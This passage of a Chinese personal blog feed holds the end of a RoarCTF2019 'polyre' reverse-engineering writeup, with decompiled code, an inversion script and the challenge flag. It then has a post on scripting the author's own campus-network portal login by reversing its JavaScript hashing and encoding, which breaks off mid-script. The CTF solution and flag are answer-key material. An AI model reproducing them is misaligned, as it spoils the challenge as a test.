class="number">2</span> * v27;</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        v26 = v25;</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      v7 = v29 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实最后看来也就是将输入的字符串分为6组，每组八个字节。然后作为long long 类型进行64次变换。</p><p>主要变换逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v27 = v4;</span><br><span class="line">    v28 = <span class="number">2</span> * v27;</span><br><span class="line">    v4 = v28;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v25 = <span class="number">2</span> * v4;</span><br><span class="line">    v26 = v25;</span><br><span class="line">    v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果大于0则直接*2，否则再异或一个0xB0004B7679FA26B3LL。</p><p>然后最后跟unk_402170做一个memcmp，那么就已知结果逆向输入了。主要我们需要怎么判断它是否&gt;0呢，其实很简单，我们可以看到如果&gt;0就单纯*2了，否则还会异或一个奇数，那么就从最低位的奇偶入手，如果是偶数则/2，如果不是那么就先异或再/2就好了。但是需要注意，负数/2并不能单纯右移一位，还要再高位添1才能保证是负数/2。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>据此写出脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0x62</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x6D</span>, <span class="number">0xF2</span>, <span class="number">0x8F</span>, <span class="number">0xBC</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0xEE</span>, <span class="number">0x30</span>, <span class="number">0x05</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x52</span>, </span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x5F</span>, <span class="number">0x93</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0xC0</span>, <span class="number">0x4D</span>, </span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x53</span>, <span class="number">0xD8</span>, <span class="number">0xAF</span>, <span class="number">0x90</span>, <span class="number">0x2B</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x36</span>, <span class="number">0x2C</span>, <span class="number">0xAA</span>, <span class="number">0xBC</span>, <span class="number">0x0E</span>, <span class="number">0x25</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x8A</span>, <span class="number">0xC6</span>, <span class="number">0xA2</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x55</span>, </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key=<span class="number">0xB0004B7679FA26B3</span>uLL;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *p=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)s;</span><br><span class="line">    <span class="keyword">int</span> iter=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(iter&lt;<span class="number">6</span>)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k=*p;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">                k^=key;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">                k |= <span class="number">0x8000000000000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">            write(<span class="number">1</span>,((<span class="keyword">char</span> *)&amp; k)+j,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        p++;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h2><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/6.png" alt="6"></p><p>flag:<code>flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录-&lt;a href=&quot;https://buuoj.cn/challenges#[RoarCTF2019]polyre&quot;&gt;RoarCTF2019 polyre&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>校园网模拟登录</title>
    <link href="http://example.com/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
    <id>http://example.com/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/</id>
    <published>2021-12-08T02:00:00.000Z</published>
    <updated>2021-12-08T14:08:41.120Z</updated>
    
    <content type="html"><![CDATA[<p>学校更新了校园网之后，用的宽带就需要每天早上进行一遍网页登录才能有网，非常的麻烦，我就萌生出了想写个模拟登录的脚本的想法。</p><span id="more"></span><h2 id="抓包获得请求方式"><a href="#抓包获得请求方式" class="headerlink" title="抓包获得请求方式"></a>抓包获得请求方式</h2><p>这里我用wireshark抓包，只抓从登录到登录成功这个时间段的包，这里主要分析我们发送的http的流量包。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/4.png" alt="1"></p><p>可以发现主要有两个流量包出现了username字段，那么主要分析这两个包内容的参数。第一个流量包内容如下</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/5.png" alt="1"></p><p>请求api为<code>http://10.110.74.99/cgi-bin/get_challenge</code></p><p>主要有四个参数，<code>callback</code>，<code>username</code>，<code>ip</code>，和<code>_</code>。callback参数不太确定，但是可以确定username是自己登录校园网的账号，ip就是自己本机在这个局域网下的ip，而<code>_</code>很明显就是时间戳。而可以看到call_back后面也有一个类似时间戳的参数。这个暂且不确定，但是后面反复抓包可以发现，这个参数就是固定的。至于本次请求是返回了什么我们可以照着参数打进去看看返回了什么数据，本人很菜，不是打web的，不会用burpsuite只能用这种办法了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/6.png" alt="1"></p><p>可以发现返回了一串json数据，里面主要有一个challenge字段，感觉是一个类似token的东西，其它的就没什么了，客户端ip，服务端ip，请求状态，产品版本和时间戳。而这里也方便了我们，可以直接从这里获取自己的ip了，但是网页端做这个估计主要还是为了这个token。但是这里并没有密码字段，还没有登录请求。</p><p>剩下的就看看另一个流量包</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/7.png" alt="1"></p><p>第二个流量包请求的api为<code>http://10.110.74.99/cgi-bin/srun_portal</code></p><p>请求的参数很多，首先依旧是callback，跟之前一样，action参数估计是标识本次请求类型为登录，第四个参数开始出现了密码字段，而这个很明显进行了md5加密，os指示操作系统类型，name为大概也是操作系统名称的意思。还有一个double_stack，虽然不懂但是反复抓包发现这个参数也是恒定不变是0，所以也不用去理解它的意思了。chksum参数是一串可能经过某种hash算法得到的值。info同样如此，只是它括起来的这个加密算法着实没听过。然后剩下的参数都是固定的就没必要去纠结了。</p><p>所以想要成功模拟登录，必须得到这些参数，需要计算的就只有password，chksum，info三个参数，那么去分析一下网页源码看看这三个参数是怎么得到的。</p><h2 id="分析网页js"><a href="#分析网页js" class="headerlink" title="分析网页js"></a>分析网页js</h2><p>F12查看，主要寻找登录按钮点击之后干干了什么</p><h3 id="password加密"><a href="#password加密" class="headerlink" title="password加密"></a>password加密</h3><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/1.png" alt="1"></p><p>可以看到只对前端进行了基本的校验之后调用了portal的login方法去登录，并且输入的用户名和密码也都传进了portal相应的变量当中，那么就去portal.js文件中分析。</p><p>发现文件很大，选择拷贝一份放ide中分析，寻找login函数，</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/2.png" alt="2"></p><p>可以发现这里主要是进行登录类型判断，进行选择，那就接着追踪。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/3.png" alt="3"></p><p>可以发现是用一个_loginAccount函数去登录的，而这个函数就在下面，我们看看它的逻辑。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/8.png" alt="3"></p><p>这里主要有一个getToken函数,然后密码用password和token进行了md5加盐的hash加密，因此password字段就很容易得出来了，那么我们接着看看token怎么获取的，之前我们通过手动请求猜测challenge字段是可能是token，这次我们跟踪_getToken函数看看。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/9.png" alt="3"></p><p>发现这里返回了res.challenge，那么就可以大胆推定刚刚的challenge就是token了。那么登录的流程应该就是，先去请求一个token，然后用token进行加密登录。这里先给出md5加密的脚本，这里参考了别的师傅的博客的做法，在这里—-&gt;<a href="https://blog.csdn.net/qq_41797946/article/details/89417722">传送门</a>，我也一直没理解它盐是怎么加的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_md5.py</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span>(<span class="params">password,token</span>):</span></span><br><span class="line"><span class="keyword">return</span> hmac.new(token.encode(), password.encode(), hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure><h3 id="chksum和info加密"><a href="#chksum和info加密" class="headerlink" title="chksum和info加密"></a>chksum和info加密</h3><p>翻到后面可以直接看到url的请求参数。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/10.png" alt="3"></p><p>url可以直接抓包获得，这个没必要去分析它的url是啥，主要看我们之前需要知道的三个字段，这里第二点不太明白了，虽然看到它的挡路方式好像是OTP，但是抓包获得的一直是{md5}，也不太懂为啥，但是我们姑且选择后者，毕竟实践才是检验真理的唯一标准嘛。</p><p>这里password的hmd5我们前面已经可以算了，接下来这个info的参数是i，chksum的参数是sha1(str)，对str进行了sha1加密。那么我们往上看看这个i和这个str是怎么获得的。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/11.png" alt="3"></p><p>这里可以看到str只是对一些参数进行了相加，最后sha1散列。</p><p>那么如此一来我们只需要得到i就可以把整个url的参数构造完成了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/12.png" alt="3"></p><p>可以看到是调用了_encodeUserInfo函数去加密得到i的，那么我们进一步搜索这个函数的加密方式。</p><p>这里我直接贴出来这个加密的函数了。</p><h3 id="加密实现脚本"><a href="#加密实现脚本" class="headerlink" title="加密实现脚本"></a>加密实现脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">_encodeUserInfo.set(_assertThisInitialized(_this), &#123;</span><br><span class="line">      <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">value</span>: <span class="function"><span class="keyword">function</span> <span class="title">value</span>(<span class="params">info, token</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 克隆自 $.base64，防止污染</span></span><br><span class="line">        <span class="keyword">var</span> base64 = _this.clone($.base64); <span class="comment">// base64 设置 Alpha</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        base64.setAlpha(<span class="string">&#x27;LVoJPiCN2R8G90yg+hmFHuacZ1OWMnrsSTXkYpUq/3dlbfKwv6xztjI7DeBE45QA&#x27;</span>); <span class="comment">// 用户信息转 JSON</span></span><br><span class="line"></span><br><span class="line">        info = <span class="built_in">JSON</span>.stringify(info);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">str, key</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (str === <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">var</span> v = s(str, <span class="literal">true</span>);</span><br><span class="line">          <span class="keyword">var</span> k = s(key, <span class="literal">false</span>);</span><br><span class="line">          <span class="keyword">if</span> (k.length &lt; <span class="number">4</span>) k.length = <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">var</span> n = v.length - <span class="number">1</span>,</span><br><span class="line">              z = v[n],</span><br><span class="line">              y = v[<span class="number">0</span>],</span><br><span class="line">              c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span>,</span><br><span class="line">              m,</span><br><span class="line">              e,</span><br><span class="line">              p,</span><br><span class="line">              q = <span class="built_in">Math</span>.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>)),</span><br><span class="line">              d = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> (<span class="number">0</span> &lt; q--) &#123;</span><br><span class="line">            d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>);</span><br><span class="line">            e = d &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n; p++) &#123;</span><br><span class="line">              y = v[p + <span class="number">1</span>];</span><br><span class="line">              m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">              m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">              m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">              z = v[p] = v[p] + m &amp; (<span class="number">0xEFB8D130</span> | <span class="number">0x10472ECF</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            m = z &gt;&gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>;</span><br><span class="line">            m += y &gt;&gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span> ^ (d ^ y);</span><br><span class="line">            m += k[p &amp; <span class="number">3</span> ^ e] ^ z;</span><br><span class="line">            z = v[n] = v[n] + m &amp; (<span class="number">0xBB390742</span> | <span class="number">0x44C6F8BD</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> l(v, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> c = a.length;</span><br><span class="line">          <span class="keyword">var</span> v = [];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; c; i += <span class="number">4</span>) &#123;</span><br><span class="line">            v[i &gt;&gt; <span class="number">2</span>] = a.charCodeAt(i) | a.charCodeAt(i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | a.charCodeAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span> | a.charCodeAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) v[v.length] = c;</span><br><span class="line">          <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> d = a.length;</span><br><span class="line">          <span class="keyword">var</span> c = d - <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (b) &#123;</span><br><span class="line">            <span class="keyword">var</span> m = a[d - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (m &lt; c - <span class="number">3</span> || m &gt; c) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            c = m;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; d; i++) &#123;</span><br><span class="line">            a[i] = <span class="built_in">String</span>.fromCharCode(a[i] &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>, a[i] &gt;&gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> b ? a.join(<span class="string">&#x27;&#x27;</span>).substring(<span class="number">0</span>, c) : a.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#123;SRBX1&#125;&#x27;</span> + base64.encode(encode(info, token));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这里也得感谢这位大佬将这个js转成了python脚本，我就直接贴结果了,里面还有一个很明显的base64，这里我也不自己写了，直接贴吧哈哈哈。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#srun_xencode.py</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force</span>(<span class="params">msg</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> msg:</span><br><span class="line">        ret.append(<span class="built_in">ord</span>(w))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ordat</span>(<span class="params">msg, idx</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(msg) &gt; idx:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(msg[idx])</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    pwd = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        pwd.append(</span><br><span class="line">            ordat(msg, i) | ordat(msg, i + <span class="number">1</span>) &lt;&lt; <span class="number">8</span> | ordat(msg, i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">            | ordat(msg, i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        pwd.append(l)</span><br><span class="line">    <span class="keyword">return</span> pwd</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    l = <span class="built_in">len</span>(msg)</span><br><span class="line">    ll = (l - <span class="number">1</span>) &lt;&lt; <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        m = msg[l - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> m &lt; ll - <span class="number">3</span> <span class="keyword">or</span> m &gt; ll:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        ll = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l):</span><br><span class="line">        msg[i] = <span class="built_in">chr</span>(msg[i] &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(</span><br><span class="line">            msg[i] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>) + <span class="built_in">chr</span>(msg[i] &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)[<span class="number">0</span>:ll]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xencode</span>(<span class="params">msg, key</span>):</span></span><br><span class="line">    <span class="keyword">if</span> msg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    pwd = sencode(msg, <span class="literal">True</span>)</span><br><span class="line">    pwdk = sencode(key, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwdk) &lt; <span class="number">4</span>:</span><br><span class="line">        pwdk = pwdk + [<span class="number">0</span>] * (<span class="number">4</span> - <span class="built_in">len</span>(pwdk))</span><br><span class="line">    n = <span class="built_in">len</span>(pwd) - <span class="number">1</span></span><br><span class="line">    z = pwd[n]</span><br><span class="line">    y = pwd[<span class="number">0</span>]</span><br><span class="line">    c = <span class="number">0x86014019</span> | <span class="number">0x183639A0</span></span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    q = math.floor(<span class="number">6</span> + <span class="number">52</span> / (n + <span class="number">1</span>))</span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; q:</span><br><span class="line">        d = d + c &amp; (<span class="number">0x8CE0D9BF</span> | <span class="number">0x731F2640</span>)</span><br><span class="line">        e = d &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p &lt; n:</span><br><span class="line">            y = pwd[p + <span 